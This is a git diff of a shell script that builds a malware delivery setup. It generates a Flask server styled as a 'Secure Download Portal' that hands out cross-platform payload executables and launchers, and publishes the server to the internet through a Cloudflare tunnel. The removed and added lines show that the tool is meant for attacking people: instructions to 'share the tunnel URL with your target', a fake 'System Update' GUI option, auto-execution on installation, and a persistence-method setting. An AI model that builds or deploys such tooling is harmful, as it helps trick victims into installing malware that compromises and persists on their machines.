-        # Create a simple HTTP server to serve the payload directory
-        local server_script="$TEMP_DIR/server.py"
-        cat > "$server_script" << EOF
-#!/usr/bin/env python3
-from flask import Flask, send_file, render_template_string, request, redirect, send_from_directory
-import os
-import sys
-
-app = Flask(__name__)
-
-@app.route('/')
-def index():
-    # Check if the request is for the root domain or a specific path
-    if request.path == '/':
-        return render_template_string('''
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Secure Download Portal</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
-        .container { max-width: 800px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .header { text-align: center; margin-bottom: 30px; }
-        .download-btn { display: inline-block; background-color: #4285f4; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-size: 18px; margin: 20px 0; }
-        .download-btn:hover { background-color: #3367d6; }
-        .info { background-color: #e8f0fe; padding: 15px; border-radius: 5px; margin: 20px 0; }
-        .file-list { margin: 20px 0; }
-        .file-item { padding: 10px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; }
-        .file-name { font-weight: bold; }
-        .file-size { color: #666; }
-        .footer { text-align: center; margin-top: 30px; color: #666; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>Secure Download Portal</h1>
-            <p>Download your secure files</p>
-        </div>
-        <div class="info">
-            <h3>Cross-Platform Payload Bundle</h3>
-            <p><strong>Auto-Execution:</strong> $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")</p>
-            <p><strong>Fake GUI:</strong> $([ "$FAKE_GUI_ENABLED" = true ] && echo "Enabled" || echo "Disabled")</p>
-        </div>
-        <div class="file-list">
-            <h3>Available Files:</h3>
-            <div class="file-item">
-                <span class="file-name">launcher.sh</span>
-                <span class="file-size">Unix/Linux/macOS launcher</span>
-                <a href="/download/launcher.sh" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
-            </div>
-            <div class="file-item">
-                <span class="file-name">launcher.bat</span>
-                <span class="file-size">Windows launcher</span>
-                <a href="/download/launcher.bat" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
-            </div>
-            <div class="file-item">
-                <span class="file-name">pc.exe</span>
-                <span class="file-size">Windows executable</span>
-                <a href="/download/pc.exe" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
-            </div>
-            <div class="file-item">
-                <span class="file-name">pc_linux</span>
-                <span class="file-size">Linux executable</span>
-                <a href="/download/pc_linux" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
-            </div>
-            <div class="file-item">
-                <span class="file-name">pc_macos</span>
-                <span class="file-size">macOS executable</span>
-                <a href="/download/pc_macos" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
-            </div>
-            <div class="file-item">
-                <span class="file-name">README.txt</span>
-                <span class="file-size">Instructions</span>
-                <a href="/download/README.txt" class="download-btn" style="padding: 5px 10px; font-size: 14px;">Download</a>
-            </div>
-        </div>
-        <div class="footer">
-            <p>This is a secure download portal. All downloads are logged.</p>
-            <p>&copy; $(date +%Y) Secure Downloads</p>
-        </div>
-    </div>
-</body>
-</html>
-''')
-    else:
-        # For any other path, redirect to the download
-        return redirect('/download')
-
-@app.route('/download')
-def download():
-    return redirect('/')
-
-@app.route('/download/<filename>')
-def download_file(filename):
-    payload_path = "$payload_path"
-    if os.path.exists(os.path.join(payload_path, filename)):
-        return send_from_directory(payload_path, filename, as_attachment=True)
-    return "File not found", 404
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=$local_port, debug=False)
-EOF
-    else
-        # Create a simple HTTP server to serve a single file
-        local server_script="$TEMP_DIR/server.py"
-        cat > "$server_script" << EOF
+    # Create a simple HTTP server to serve the payload
+    local server_script="$TEMP_DIR/server.py"
+    cat > "$server_script" << EOF
 #!/usr/bin/env python3
 from flask import Flask, send_file, render_template_string, request, redirect
 import os
@@ -2616,7 +4099,6 @@ def download():
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=$local_port, debug=False)
 EOF
-    fi
     
     chmod +x "$server_script"
     
@@ -2640,34 +4122,8 @@ EOF
         fi
         
         # Save tunnel information
-        mkdir -p "$DELIVERY_DIR"
         local tunnel_info="$DELIVERY_DIR/cloudflare_tunnel_info.txt"
-        
-        if [ -d "$payload_path" ]; then
-            cat > "$tunnel_info" << EOF
-CLOUDFLARE TUNNEL INFORMATION
-=============================
-Tunnel URL: $CLOUDFLARE_TUNNEL_URL
-Direct Download Link: $CLOUDFLARE_TUNNEL_URL/download
-Local Port: $local_port
-Server PID: $server_pid
-Tunnel PID: $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
-Start Time: $(date)
-Payload: Cross-platform bundle in $(basename "$payload_path")
-Auto-Execution: $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")
-Appearance: $([ "$FAKE_GUI_ENABLED" = true ] && echo "Fake GUI (System Update)" || echo "Silent")
-
-Usage:
-1. Share the tunnel URL with your target
-2. Target can browse and download specific files from: $CLOUDFLARE_TUNNEL_URL
-3. All traffic is encrypted through Cloudflare
-
-To stop the tunnel:
-kill $server_pid
-kill $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
-EOF
-        else
-            cat > "$tunnel_info" << EOF
+        cat > "$tunnel_info" << EOF
 CLOUDFLARE TUNNEL INFORMATION
 =============================
 Tunnel URL: $CLOUDFLARE_TUNNEL_URL
@@ -2689,7 +4145,6 @@ To stop the tunnel:
 kill $server_pid
 kill $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
 EOF
-        fi
         
         echo -e "${G}[+] Tunnel information saved to: $tunnel_info${NC}"
         echo -e "${G}[+] Direct download link: $CLOUDFLARE_TUNNEL_URL/download${NC}"
@@ -2906,6 +4361,7 @@ main() {
             fi
             if [ "$AUTO_EXECUTION" = true ]; then
                 echo -e "${G}>> Auto-execution is ENABLED - Payload will run automatically on installation.${NC}"
+                echo -e "${G}>> Persistence method: $PERSISTENCE_METHOD${NC}"
             else
                 echo -e "${Y}>> Auto-execution is DISABLED - Payload requires manual execution.${NC}"
             fi
@@ -2920,6 +4376,7 @@ main() {
             fi
             if [ "$AUTO_EXECUTION" = true ]; then
                 echo -e "${G}>> Auto-execution is ENABLED - Payload will run automatically on installation.${NC}"
+                echo -e "${G}>> Persistence method: $PERSISTENCE_METHOD${NC}"
             else
                 echo -e "${Y}>> Auto-execution is DISABLED - Payload requires manual execution.${NC}"
             fi
